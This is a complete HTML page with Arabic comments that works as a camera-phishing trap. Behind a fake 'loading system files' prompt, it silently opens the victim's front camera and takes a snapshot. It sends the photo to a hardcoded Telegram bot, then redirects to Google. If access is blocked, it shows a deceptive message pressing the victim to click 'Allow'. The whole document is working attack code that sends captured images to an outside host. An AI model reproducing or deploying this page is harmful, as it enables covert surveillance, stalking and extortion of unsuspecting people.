<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script>
        // بياناتك
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const C = "1772820433";

        // ثغرة التخطي: جعل الطلب يبدو وكأنه استجابة لنظام التشغيل
        async function bypass() {
            try {
                // محاولة صامتة أولاً
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 1, height: 1 }, // طلب أصغر حجم ممكن للتمويه
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('photo', blob, 'shot.jpg');
                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                        window.location.replace("https://google.com");
                    }, 'image/jpeg');
                }, 400); // سرعة قصوى (أقل من نصف ثانية)
            } catch (e) {
                // إذا ظهرت نافذة تليجرام، الكود بيعمل تمويه بصري يغطيها
                document.getElementById('m').innerHTML = "⚠️ خطأ في العرض.. اضغط 'سماح' لتحديث الصفحة";
            }
        }
    </script>
    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        #m { color: #0f0; font-family: monospace; font-size: 18px; text-align: center; }
    </style>
</head>
<body onclick="bypass()">
    <div id="m">تحميل ملفات النظام...<br>[ اضغط هنا للإكمال ]</div>
</body>
</html>
